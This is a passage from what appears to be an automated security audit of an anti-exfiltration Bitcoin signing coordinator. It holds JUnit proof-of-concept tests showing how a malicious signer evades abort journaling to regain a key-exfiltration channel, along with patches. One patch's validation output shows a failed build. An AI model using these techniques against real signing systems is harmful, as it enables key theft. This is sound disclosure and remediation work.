        assertEquals(0, bypassed.getStatus().getPostRevealAbortCount(),
                "the stale alias journal bypasses the unacknowledged fresh-session gate");
    }

    private static byte[] openingsFor(AntiExfilMessage commit, byte[] openingPoint) {
        List<AntiExfilSlot> slots = new ArrayList<>();
        for(AntiExfilSlot slot : commit.getSlots()) {
            slots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                    slot.getMessageHash(), slot.getCommitment(), openingPoint, null, null));
        }
        return AntiExfilCodec.encode(new AntiExfilMessage(commit.getNetwork(), AntiExfilStage.SIGNER_OPENINGS,
                commit.getSessionId(), commit.getPsbtDigest(), slots));
    }

    private static void assertRhosEqualForEverySlot(byte[] leftReveal, byte[] rightReveal) {
        AntiExfilMessage left = AntiExfilCodec.decode(leftReveal);
        AntiExfilMessage right = AntiExfilCodec.decode(rightReveal);
        assertEquals(AntiExfilStage.HOST_REVEAL, left.getStage());
        assertEquals(AntiExfilStage.HOST_REVEAL, right.getStage());
        assertEquals(left.getSlots().size(), right.getSlots().size());
        for(int i = 0; i < left.getSlots().size(); i++) {
            AntiExfilSlot leftSlot = left.getSlots().get(i);
            AntiExfilSlot rightSlot = right.getSlots().get(i);
            assertArrayEquals(leftSlot.getHostRandomness(), rightSlot.getHostRandomness(),
                    "the fork reveals the same persisted rho for slot " + i);
            assertFalse(Arrays.equals(leftSlot.getOpening(), rightSlot.getOpening()),
                    "the same rho is accepted against a different signer opening for slot " + i);
        }
    }

    private static String loadVector(String resource) throws IOException {
        try(InputStream stream = Poc.class.getResourceAsStream(resource)) {
            assertNotNull(stream, "Missing test vector " + resource);
            return new String(stream.readAllBytes(), StandardCharsets.UTF_8);
        }
    }

    private static String field(String vector, String name) {
        Matcher matcher = Pattern.compile(STRING_FIELD.pattern().formatted(Pattern.quote(name))).matcher(vector);
        assertTrue(matcher.find(), "Missing vector field " + name);
        return matcher.group(1);
    }

    private static Keystore keystore() throws Exception {
        DeterministicSeed seed = new DeterministicSeed(WORDS, "", 0, DeterministicSeed.Type.BIP39);
        return Keystore.fromSeed(seed, PolicyType.SINGLE_HD, KeyDerivation.parsePath("m/84'/1'/0'"));
    }

    private static final class VectorRandom extends SecureRandom {
        private int call;

        @Override
        public void nextBytes(byte[] bytes) {
            Arrays.fill(bytes, call++ == 0 ? (byte)'z' : (byte)(0x7f + call - 1));
        }
    }
}
```
### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   src/test/java/com/sparrowwallet/drongo/antiexfil/Poc.java

# build and run
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew testClasses
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --rerun-tasks --tests 'com.sparrowwallet.drongo.antiexfil.Poc'
```
### Output

```
[output truncated: 19 lines & 0.65234375 KB skipped]
> Task :processResources
> Task :classes
> Task :compileTestJava
> Task :processTestResources
> Task :testClasses
> Task :test

BUILD SUCCESSFUL in 4s
5 actionable tasks: 5 executed
Consider enabling configuration cache to speed up this build: https://docs.gradle.org/9.1.0/userguide/configuration_cache_enabling.html
```
### Considerations

PoC passed with `JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --rerun-tasks --tests 'com.sparrowwallet.drongo.antiexfil.Poc'` and exercises the real Java coordinator, durable-file, codec, and abort-journal code. It uses hard-link aliases on the local filesystem; it demonstrates the same alias-splitting state transition sequentially after atomic replacement rather than racing two threads inside the lock window.
### Validation reasoning

PoC validation command completed successfully.
## Remediation
### Explanation

Serialize existing durable-state operations on the underlying file inode as well as the pathname sidecar, so hard-link and symlink aliases share a lock. Before atomic replacement, invalidate that locked inode so detached aliases cannot retain a valid stale session or journal history.
### Patch

```diff
diff --git a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilDurableFiles.java b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilDurableFiles.java
--- a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilDurableFiles.java
+++ b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilDurableFiles.java
@@ -1,88 +1,104 @@
 package com.sparrowwallet.drongo.antiexfil;
 
 import com.sparrowwallet.drongo.protocol.Sha256Hash;
 
 import java.io.IOException;
 import java.nio.ByteBuffer;
 import java.nio.channels.FileChannel;
 import java.nio.channels.FileLock;
 import java.nio.file.AtomicMoveNotSupportedException;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.StandardCopyOption;
 import java.nio.file.StandardOpenOption;
 import java.util.Arrays;
 import java.util.EnumSet;
 
 import static java.nio.file.attribute.PosixFilePermission.OWNER_READ;
 import static java.nio.file.attribute.PosixFilePermission.OWNER_WRITE;
 
 final class AntiExfilDurableFiles {
     private AntiExfilDurableFiles() {
     }
 
     static <T> T locked(Path target, IOAction<T> action) {
         try {
             Path absolute = target.toAbsolutePath();
             Path parent = absolute.getParent();
             if(parent == null) throw new IOException("Durable state requires a parent directory");
             Files.createDirectories(parent);
             Path lockPath = parent.resolve(absolute.getFileName() + ".lock");
-            try(FileChannel channel = FileChannel.open(lockPath, StandardOpenOption.CREATE, StandardOpenOption.WRITE);
-                FileLock ignored = channel.lock()) {
+            try(FileChannel pathChannel = FileChannel.open(lockPath, StandardOpenOption.CREATE, StandardOpenOption.WRITE);
+                FileLock ignoredPath = pathChannel.lock()) {
+                if(Files.exists(absolute)) {
+                    // The state-inode lock is shared by hard-link and symlink aliases; the sidecar also
+                    // serializes callers that opened an inode just before this pathname was replaced.
+                    try(FileChannel stateChannel = FileChannel.open(absolute, StandardOpenOption.WRITE);
+                        FileLock ignoredState = stateChannel.lock()) {
+                        return action.run();
+                    }
+                }
                 return action.run();
             }
         } catch(IOException e) {
             throw new AntiExfilException(AntiExfilException.Code.STATE_INVALID,
                     "Cannot access durable anti-exfil state: " + e.getMessage(), e);
         }
     }
 
     static byte[] read(Path path, int maximumBytes) throws IOException {
         byte[] encoded = Files.readAllBytes(path);
         if(encoded.length < 32 || encoded.length > maximumBytes) throw new IOException("State length is outside limits");
         byte[] body = Arrays.copyOf(encoded, encoded.length - 32);
         byte[] checksum = Arrays.copyOfRange(encoded, encoded.length - 32, encoded.length);
         if(!Arrays.equals(Sha256Hash.hash(body), checksum)) throw new IOException("State checksum mismatch");
         return body;
     }
 
     static void write(Path path, byte[] body, boolean createOnly) throws IOException {
         if(createOnly && Files.exists(path)) throw new IOException("State already exists");
         byte[] encoded = ByteBuffer.allocate(body.length + 32).put(body).put(Sha256Hash.hash(body)).array();
         Path absolute = path.toAbsolutePath();
         Path parent = absolute.getParent();
         Path temporary = Files.createTempFile(parent, absolute.getFileName() + ".", ".tmp");
         boolean moved = false;
         try {
             try {
                 Files.setPosixFilePermissions(temporary, EnumSet.of(OWNER_READ, OWNER_WRITE));
             } catch(UnsupportedOperationException ignored) {
                 // Windows uses inherited ACLs; POSIX stores are restricted explicitly.
             }
             try(FileChannel channel = FileChannel.open(temporary, StandardOpenOption.WRITE,
                     StandardOpenOption.TRUNCATE_EXISTING)) {
                 ByteBuffer buffer = ByteBuffer.wrap(encoded);
                 while(buffer.hasRemaining()) channel.write(buffer);
                 channel.force(true);
             }
             try {
+                if(!createOnly && Files.exists(absolute)) {
+                    // Atomic replacement detaches hard-link aliases. Invalidate the locked inode first so
+                    // no alias can retain a valid pre-update security history after the replacement.
+                    try(FileChannel channel = FileChannel.open(absolute, StandardOpenOption.WRITE,
+                            StandardOpenOption.TRUNCATE_EXISTING)) {
+                        channel.force(true);
+                    }
+                }
                 if(createOnly) {
                     Files.move(temporary, absolute, StandardCopyOption.ATOMIC_MOVE);
                 } else {
                     Files.move(temporary, absolute, StandardCopyOption.ATOMIC_MOVE, StandardCopyOption.REPLACE_EXISTING);
                 }
             } catch(AtomicMoveNotSupportedException e) {
                 throw new IOException("Filesystem does not support atomic durable-state replacement", e);
             }
             moved = true;
         } finally {
             if(!moved) Files.deleteIfExists(temporary);
         }
     }
 
     @FunctionalInterface
     interface IOAction<T> {
         T run() throws IOException;
     }
 }
```
### Affected files
- `src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilDurableFiles.java`
### Validation output

```
[output truncated: 29 lines & 0.8701171875 KB skipped]
FAILURE: Build failed with an exception.

* What went wrong:
Execution failed for task ':test'.
> There were failing tests. See the report at: file:///repo/build/reports/tests/test/index.html

* Try:
> Run with --scan to generate a Build Scan (Powered by Develocity).

BUILD FAILED in 5s
```

---

# Signature rejection is not journaled automatically
**#247992**
- Severity: Medium
- Validity: Unreviewed
## Source locations
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java` (3 locations)
#### Lines 152-172 — _All post-reveal validation failures precede the state write and have no journal handling._

```
    public Completion complete(byte[] encodedSignatures) {
        if(encodedSignatures == null) throw fail(INVALID_MESSAGE, "Signer signatures are required");
        return AntiExfilDurableFiles.locked(sessionPath, () -> {
            State state = readValidatedStateUnlocked();
            if(state.phase == Phase.COMMITMENTS_CREATED) throw fail(WRONG_STAGE, "Cannot complete before accepting openings");
            if(state.phase == Phase.COMPLETE) {
                if(!Arrays.equals(encodedSignatures, state.message4)) throw fail(RETRY_CONFLICT, "Completed session received different signatures");
                return completion(state);
            }
            AntiExfilMessage reveal = AntiExfilCodec.decode(state.message3);
            AntiExfilMessage signatures = AntiExfilCodec.decode(encodedSignatures);
            if(signatures.getStage() != AntiExfilStage.SIGNER_SIGNATURES) throw fail(WRONG_STAGE, "Expected signer signatures");
            AntiExfilCodec.validateTransition(reveal, signatures);
            byte[] signed = AntiExfilPsbt.reconstructSignedPsbt(state.originalPsbt, keystore,
                    AntiExfilCodec.decode(state.message1), signatures, state.rhos);
            State complete = new State(Phase.COMPLETE, state.walletIdentity, state.originalPsbt,
                    state.message1, state.message2, state.message3, encodedSignatures, signed, state.rhos);
            AntiExfilDurableFiles.write(sessionPath, encode(complete), false);
            return completion(complete);
        });
    }
```
⋯
#### Lines 207-218 — _Abort recording is a separate caller-driven operation._

```
    public AntiExfilAbortJournal.AbortEvent recordPostRevealAbort(AbortReason reason) {
        return AntiExfilDurableFiles.locked(sessionPath, () -> {
            State state = readValidatedStateUnlocked();
            if(state.phase != Phase.OPENINGS_ACCEPTED) {
                throw fail(WRONG_STAGE, "Only an incomplete post-reveal session can record a selective-abort event");
            }
            if(reason == null) throw fail(STATE_INVALID, "A post-reveal abort reason is required");
            AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
            return new AntiExfilAbortJournal(journalPath, walletIdentity).append(
                    commit.getSessionId(), commit.getPsbtDigest(), reason.name());
        });
    }
```
⋯
#### Lines 387-391 — _SIGNATURE_REJECTED exists but is not used by complete._

```
    public enum AbortReason {
        TRANSPORT_FAILED,
        SIGNER_CANCELLED,
        SIGNATURE_REJECTED,
        USER_ABANDONED
```
## Description

After rho has been disclosed, `complete` can reject a malformed, context-changing, or cryptographically invalid signature message before writing `COMPLETE`. The session remains `OPENINGS_ACCEPTED`, but no abort event is recorded automatically even though `SIGNATURE_REJECTED` is an explicit reason. Journaling is available only through a separate manual `recordPostRevealAbort` call, and the coordinator documents no mandatory caller obligation to invoke it on every exception. A malicious signer can intentionally make `complete` throw after inspecting rho; a normal exception-then-new-session retry sees the still-empty journal and receives another host contribution without acknowledgement.
## Root cause

Post-reveal failure detection and abort journaling are separate operations; `complete` fails open with respect to the journal instead of atomically recording a failed revealed ceremony.
## Impact

A malicious signer can obtain repeated unacknowledged post-reveal attempts by returning invalid signatures, restoring selective nonce grinding and a key-exfiltration channel. Status and abort counters continue reporting no abort, so integrations receive no durable warning.
## Proof of concept
### Test case

```
package com.sparrowwallet.drongo.antiexfil;

import com.sparrowwallet.drongo.KeyDerivation;
import com.sparrowwallet.drongo.Utils;
import com.sparrowwallet.drongo.crypto.ECKey;
import com.sparrowwallet.drongo.policy.PolicyType;
import com.sparrowwallet.drongo.wallet.DeterministicSeed;
import com.sparrowwallet.drongo.wallet.Keystore;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.IOException;
import java.io.InputStream;
import java.math.BigInteger;
import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Dedicated, package-scoped PoC slot for anti-exfil security reproductions.
 */
class Poc {
    private static final String WORDS = "model ensure search plunge galaxy firm exclude brain satoshi meadow cable roast";
    private static final Pattern STRING_FIELD = Pattern.compile("\\\"%s\\\"\\s*:\\s*\\\"([0-9a-f]+)\\\"");

    @TempDir
    Path temporary;

    @Test
    void invalidPostRevealSignaturesAreRejectedWithoutAutomaticAbortJournal() throws Exception {
        String vector = loadVector("protocol-v1-semantic-psbt-vector.json");
        byte[] original = Utils.hexToBytes(field(vector, "psbt_hex"));
        Keystore keystore = keystore();
        Path journal = temporary.resolve("wallet-aborts.aexj");

        Path firstSession = temporary.resolve("first-failed-signature-session.aexs");
        AntiExfilCoordinator coordinator = AntiExfilCoordinator.create(firstSession, journal, original, keystore,
                AntiExfilNetwork.TESTNET4);
        byte[] reveal = coordinator.acceptOpenings(openingsFromCommit(coordinator.getHostCommitMessage()));
        byte[] invalidSignatures = invalidSignaturesFromReveal(reveal);

        AntiExfilException rejected = assertThrows(AntiExfilException.class,
                () -> coordinator.complete(invalidSignatures));
        assertEquals(AntiExfilException.Code.SIGNATURE_INVALID, rejected.getCode());

        AntiExfilCoordinator.Status afterRejectedSignature = AntiExfilCoordinator.load(firstSession, journal, keystore).getStatus();
        assertEquals(AntiExfilCoordinator.Phase.OPENINGS_ACCEPTED, afterRejectedSignature.getPhase());
        assertEquals(0, afterRejectedSignature.getPostRevealAbortCount());
        assertTrue(new AntiExfilAbortJournal(journal, AntiExfilCoordinator.getWalletKeyIdentity(keystore)).getEvents().isEmpty());

        Path secondSession = temporary.resolve("second-unacknowledged-session.aexs");
        AntiExfilCoordinator unacknowledgedRetry = AntiExfilCoordinator.create(secondSession, journal, original, keystore,
                AntiExfilNetwork.TESTNET4);
        assertEquals(0, unacknowledgedRetry.getStatus().getPostRevealAbortCount());
        assertEquals(AntiExfilCoordinator.Phase.COMMITMENTS_CREATED, unacknowledgedRetry.getStatus().getPhase());
    }

    private static byte[] openingsFromCommit(byte[] encodedCommit) {
        AntiExfilMessage commit = AntiExfilCodec.decode(encodedCommit);
        byte[] attackerOpening = ECKey.fromPrivate(BigInteger.TWO).getPubKey();
        List<AntiExfilSlot> openingSlots = new ArrayList<>();
        for(AntiExfilSlot slot : commit.getSlots()) {
            openingSlots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                    slot.getMessageHash(), slot.getCommitment(), attackerOpening, null, null));
        }
        return AntiExfilCodec.encode(new AntiExfilMessage(commit.getNetwork(), AntiExfilStage.SIGNER_OPENINGS,
                commit.getSessionId(), commit.getPsbtDigest(), openingSlots));
    }

    private static byte[] invalidSignaturesFromReveal(byte[] encodedReveal) {
        AntiExfilMessage reveal = AntiExfilCodec.decode(encodedReveal);
        byte[] invalidLowSCompactSignature = new byte[64];
        invalidLowSCompactSignature[31] = 1;
        invalidLowSCompactSignature[63] = 1;
        List<AntiExfilSlot> signatureSlots = new ArrayList<>();
        for(AntiExfilSlot slot : reveal.getSlots()) {
            signatureSlots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                    slot.getMessageHash(), slot.getCommitment(), slot.getOpening(), null, invalidLowSCompactSignature));
        }
        return AntiExfilCodec.encode(new AntiExfilMessage(reveal.getNetwork(), AntiExfilStage.SIGNER_SIGNATURES,
                reveal.getSessionId(), reveal.getPsbtDigest(), signatureSlots));
    }

    private static String loadVector(String resource) throws IOException {
        try(InputStream stream = Poc.class.getResourceAsStream(resource)) {
            assertNotNull(stream, "Missing test vector " + resource);
            return new String(stream.readAllBytes(), StandardCharsets.UTF_8);
        }
    }

    private static String field(String vector, String name) {
        Matcher matcher = Pattern.compile(STRING_FIELD.pattern().formatted(Pattern.quote(name))).matcher(vector);
        assertTrue(matcher.find(), "Missing vector field " + name);
        return matcher.group(1);
    }

    private static Keystore keystore() throws Exception {
        DeterministicSeed seed = new DeterministicSeed(WORDS, "", 0, DeterministicSeed.Type.BIP39);
        return Keystore.fromSeed(seed, PolicyType.SINGLE_HD, KeyDerivation.parsePath("m/84'/1'/0'"));
    }
}
```
### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   src/test/java/com/sparrowwallet/drongo/antiexfil/Poc.java

# build and run
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew testClasses
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --rerun-tasks --tests 'com.sparrowwallet.drongo.antiexfil.Poc'
```
### Output

```
[output truncated: 10 lines & 0.6259765625 KB skipped]
> Task :processResources
> Task :classes
> Task :compileTestJava
> Task :processTestResources
> Task :testClasses
> Task :test

BUILD SUCCESSFUL in 6s
5 actionable tasks: 5 executed
Consider enabling configuration cache to speed up this build: https://docs.gradle.org/9.1.0/userguide/configuration_cache_enabling.html
```
### Considerations

PoC compiled and executed with `JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --rerun-tasks --tests 'com.sparrowwallet.drongo.antiexfil.Poc'`; JUnit XML shows 1 executed test, 0 failures, 0 errors. The test demonstrates the `SIGNATURE_INVALID` post-reveal rejection path; it does not separately exercise malformed decode failures or context-changing stage-4 failures, which share the same `complete()` pre-write/no-catch structure.
### Validation reasoning

PoC validation command completed successfully.
## Remediation
### Explanation

Automatically append a durable SIGNATURE_REJECTED abort event whenever a post-reveal completion message is null or fails protocol/cryptographic validation, before propagating the original rejection; successful completion and pre-reveal/completed-session behavior remain unchanged.
### Patch

```diff
diff --git a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java
--- a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java
+++ b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java
@@ -1,450 +1,465 @@
 package com.sparrowwallet.drongo.antiexfil;
 
 import com.sparrowwallet.drongo.protocol.Sha256Hash;
 import com.sparrowwallet.drongo.psbt.PSBT;
 import com.sparrowwallet.drongo.wallet.Keystore;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.EOFException;
 import java.io.IOException;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.security.SecureRandom;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Collections;
 import java.util.LinkedHashSet;
 import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.Map;
 import java.util.Set;
 
 import static com.sparrowwallet.drongo.antiexfil.AntiExfilException.Code.*;
 
 public final class AntiExfilCoordinator {
     private static final byte[] MAGIC = {'A', 'E', 'X', 'S'};
     private static final int VERSION = 1;
     private static final int MAX_STATE_BYTES = 32 * 1024 * 1024;
     private static final int MAX_PSBT_BYTES = 16 * 1024 * 1024;
     private static final int MAX_BLOB_BYTES = 16 * 1024 * 1024;
 
     private final Path sessionPath;
     private final Path journalPath;
     private final Keystore keystore;
     private final byte[] walletIdentity;
 
     private AntiExfilCoordinator(Path sessionPath, Path journalPath, Keystore keystore) {
         if(sessionPath == null || journalPath == null || keystore == null) throw fail(STATE_INVALID, "Coordinator paths and keystore are required");
         this.sessionPath = sessionPath;
         this.journalPath = journalPath;
         this.keystore = keystore;
         this.walletIdentity = walletIdentity(keystore);
     }
 
     public static AntiExfilCoordinator create(Path sessionPath, Path journalPath, byte[] originalPsbt,
                                                Keystore keystore, AntiExfilNetwork network) {
         return create(sessionPath, journalPath, originalPsbt, keystore, network, false, new SecureRandom());
     }
 
     public static AntiExfilCoordinator create(Path sessionPath, Path journalPath, byte[] originalPsbt,
                                                Keystore keystore, AntiExfilNetwork network,
                                                boolean acknowledgePostRevealAbortRisk) {
         return create(sessionPath, journalPath, originalPsbt, keystore, network,
                 acknowledgePostRevealAbortRisk, new SecureRandom());
     }
 
     static AntiExfilCoordinator create(Path sessionPath, Path journalPath, byte[] originalPsbt,
                                         Keystore keystore, AntiExfilNetwork network,
                                         boolean acknowledgePostRevealAbortRisk, SecureRandom random) {
         AntiExfilCoordinator coordinator = new AntiExfilCoordinator(sessionPath, journalPath, keystore);
         if(originalPsbt == null || originalPsbt.length > MAX_PSBT_BYTES || network == null || random == null) {
             throw fail(INVALID_MESSAGE, "Invalid coordinator initialization");
         }
         List<AntiExfilSigningSlot> slots = AntiExfilPsbt.enumerateSigningSlots(originalPsbt, keystore);
         byte[] sessionId = random32(random);
         Map<AntiExfilSigningSlot.Identifier, byte[]> rhos = new LinkedHashMap<>();
         for(AntiExfilSigningSlot slot : slots) {
             byte[] rho;
             int attempts = 0;
             do {
                 if(attempts++ >= 1024) throw fail(STATE_INVALID, "CSPRNG repeatedly produced duplicate host randomness");
                 rho = random32(random);
             } while(containsValue(rhos, rho));
             rhos.put(slot.getIdentifier(), rho);
         }
         AntiExfilMessage commit = AntiExfilPsbt.buildHostCommitMessage(originalPsbt, keystore, network, sessionId, rhos);
         State state = new State(Phase.COMMITMENTS_CREATED, coordinator.walletIdentity, originalPsbt,
                 AntiExfilCodec.encode(commit), null, null, null, null, rhos);
         List<AntiExfilAbortJournal.AbortEvent> aborts = new AntiExfilAbortJournal(journalPath, coordinator.walletIdentity).getEvents();
         if(!aborts.isEmpty() && !acknowledgePostRevealAbortRisk) {
             throw fail(RETRY_CONFLICT, "Post-reveal abort history requires explicit high-severity acknowledgement before a fresh session");
         }
         AntiExfilDurableFiles.locked(sessionPath, () -> {
             AntiExfilDurableFiles.write(sessionPath, encode(state), true);
             return null;
         });
         return coordinator;
     }
 
     public static AntiExfilCoordinator load(Path sessionPath, Path journalPath, Keystore keystore) {
         AntiExfilCoordinator coordinator = new AntiExfilCoordinator(sessionPath, journalPath, keystore);
         coordinator.readValidatedState();
         new AntiExfilAbortJournal(journalPath, coordinator.walletIdentity).getEvents();
         return coordinator;
     }
 
     public byte[] getHostCommitMessage() {
         return readValidatedState().message1.clone();
     }
 
     public byte[] getFrozenPsbt() {
         return readValidatedState().originalPsbt.clone();
     }
 
     public byte[] getHostRevealMessage() {
         State state = readValidatedState();
         if(state.phase == Phase.COMMITMENTS_CREATED) throw fail(WRONG_STAGE, "Signer openings have not been accepted");
         return state.message3.clone();
     }
 
     public Completion getCompletedResult() {
         State state = readValidatedState();
         if(state.phase != Phase.COMPLETE) throw fail(WRONG_STAGE, "Coordinator session is not complete");
         return completion(state);
     }
 
     public byte[] acceptOpenings(byte[] encodedOpenings) {
         if(encodedOpenings == null) throw fail(INVALID_MESSAGE, "Signer openings are required");
         return AntiExfilDurableFiles.locked(sessionPath, () -> {
             State state = readValidatedStateUnlocked();
             if(state.phase == Phase.COMPLETE || state.phase == Phase.OPENINGS_ACCEPTED) {
                 if(!Arrays.equals(encodedOpenings, state.message2)) throw fail(RETRY_CONFLICT, "Retry changed accepted signer openings");
                 return state.message3.clone();
             }
             AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
             AntiExfilMessage openings = AntiExfilCodec.decode(encodedOpenings);
             if(openings.getStage() != AntiExfilStage.SIGNER_OPENINGS) throw fail(WRONG_STAGE, "Expected signer openings");
             AntiExfilCodec.validateTransition(commit, openings);
             List<AntiExfilSlot> revealSlots = new ArrayList<>(openings.getSlots().size());
             for(AntiExfilSlot slot : openings.getSlots()) {
                 AntiExfilSigningSlot.Identifier identifier = identifier(slot);
                 byte[] rho = state.rhos.get(identifier);
                 if(rho == null) throw fail(SIGNATURE_SLOT_MISMATCH, "Opening has no authoritative host-randomness slot");
                 revealSlots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                         slot.getMessageHash(), slot.getCommitment(), slot.getOpening(), rho, null));
             }
             AntiExfilMessage reveal = new AntiExfilMessage(openings.getNetwork(), AntiExfilStage.HOST_REVEAL,
                     openings.getSessionId(), openings.getPsbtDigest(), revealSlots);
             AntiExfilCodec.validateTransition(openings, reveal);
             byte[] message3 = AntiExfilCodec.encode(reveal);
             State accepted = new State(Phase.OPENINGS_ACCEPTED, state.walletIdentity, state.originalPsbt,
                     state.message1, encodedOpenings, message3, null, null, state.rhos);
             // This durable write is the security boundary: no rho is returned before it succeeds.
             AntiExfilDurableFiles.write(sessionPath, encode(accepted), false);
             return message3.clone();
         });
     }
 
     public Completion complete(byte[] encodedSignatures) {
-        if(encodedSignatures == null) throw fail(INVALID_MESSAGE, "Signer signatures are required");
         return AntiExfilDurableFiles.locked(sessionPath, () -> {
             State state = readValidatedStateUnlocked();
+            if(encodedSignatures == null) {
+                if(state.phase == Phase.OPENINGS_ACCEPTED) recordSignatureRejection(state);
+                throw fail(INVALID_MESSAGE, "Signer signatures are required");
+            }
             if(state.phase == Phase.COMMITMENTS_CREATED) throw fail(WRONG_STAGE, "Cannot complete before accepting openings");
             if(state.phase == Phase.COMPLETE) {
                 if(!Arrays.equals(encodedSignatures, state.message4)) throw fail(RETRY_CONFLICT, "Completed session received different signatures");
                 return completion(state);
             }
-            AntiExfilMessage reveal = AntiExfilCodec.decode(state.message3);
-            AntiExfilMessage signatures = AntiExfilCodec.decode(encodedSignatures);
-            if(signatures.getStage() != AntiExfilStage.SIGNER_SIGNATURES) throw fail(WRONG_STAGE, "Expected signer signatures");
-            AntiExfilCodec.validateTransition(reveal, signatures);
-            byte[] signed = AntiExfilPsbt.reconstructSignedPsbt(state.originalPsbt, keystore,
-                    AntiExfilCodec.decode(state.message1), signatures, state.rhos);
+            byte[] signed;
+            try {
+                AntiExfilMessage reveal = AntiExfilCodec.decode(state.message3);
+                AntiExfilMessage signatures = AntiExfilCodec.decode(encodedSignatures);
+                if(signatures.getStage() != AntiExfilStage.SIGNER_SIGNATURES) throw fail(WRONG_STAGE, "Expected signer signatures");
+                AntiExfilCodec.validateTransition(reveal, signatures);
+                signed = AntiExfilPsbt.reconstructSignedPsbt(state.originalPsbt, keystore,
+                        AntiExfilCodec.decode(state.message1), signatures, state.rhos);
+            } catch(AntiExfilException e) {
+                recordSignatureRejection(state);
+                throw e;
+            }
             State complete = new State(Phase.COMPLETE, state.walletIdentity, state.originalPsbt,
                     state.message1, state.message2, state.message3, encodedSignatures, signed, state.rhos);
             AntiExfilDurableFiles.write(sessionPath, encode(complete), false);
             return completion(complete);
         });
     }
 
+    private void recordSignatureRejection(State state) {
+        AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
+        new AntiExfilAbortJournal(journalPath, walletIdentity).append(
+                commit.getSessionId(), commit.getPsbtDigest(), AbortReason.SIGNATURE_REJECTED.name());
+    }
+
     private Completion completion(State state) {
         return new Completion(state.signedPsbt, deriveVerifiedSignatures(state), false);
     }
 
     private Set<VerifiedAntiExfilSignature> deriveVerifiedSignatures(State state) {
         if(state.phase != Phase.COMPLETE || state.message4 == null || state.signedPsbt == null) invalidPhase();
         AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
         AntiExfilMessage signatures = AntiExfilCodec.decode(state.message4);
         List<AntiExfilSigningSlot> semantic = AntiExfilPsbt.enumerateSigningSlots(state.originalPsbt, keystore);
         byte[] reconstructed = AntiExfilPsbt.reconstructSignedPsbt(state.originalPsbt, keystore,
                 commit, signatures, state.rhos);
         if(!Arrays.equals(reconstructed, state.signedPsbt)) {
             throw fail(STATE_INVALID, "Verified-signature evidence does not reconstruct the stored signed PSBT");
         }
         PSBT original = AntiExfilPsbt.parseCanonicalV0(state.originalPsbt);
         byte[] originalDigest = Sha256Hash.hash(state.originalPsbt);
         Set<VerifiedAntiExfilSignature> verified = new LinkedHashSet<>();
         for(int i = 0; i < semantic.size(); i++) {
             AntiExfilSigningSlot authoritative = semantic.get(i);
             AntiExfilSlot signature = signatures.getSlots().get(i);
             byte[] outpoint = original.getTransaction().getInputs().get(authoritative.getInputIndex())
                     .getOutpoint().bitcoinSerialize();
             verified.add(new VerifiedAntiExfilSignature(commit.getSessionId(), originalDigest,
                     state.walletIdentity, authoritative.getInputIndex(), outpoint,
                     authoritative.getSignerPublicKey(), authoritative.getMessageHash(),
                     authoritative.getSighashType(), signature.getSignature()));
         }
         if(verified.size() != semantic.size()) {
             throw fail(STATE_INVALID, "Verified-signature evidence contains duplicate records");
         }
         return Collections.unmodifiableSet(verified);
     }
 
     public AntiExfilAbortJournal.AbortEvent recordPostRevealAbort(AbortReason reason) {
         return AntiExfilDurableFiles.locked(sessionPath, () -> {
             State state = readValidatedStateUnlocked();
             if(state.phase != Phase.OPENINGS_ACCEPTED) {
                 throw fail(WRONG_STAGE, "Only an incomplete post-reveal session can record a selective-abort event");
             }
             if(reason == null) throw fail(STATE_INVALID, "A post-reveal abort reason is required");
             AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
             return new AntiExfilAbortJournal(journalPath, walletIdentity).append(
                     commit.getSessionId(), commit.getPsbtDigest(), reason.name());
         });
     }
 
     public Status getStatus() {
         State state = readValidatedState();
         AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
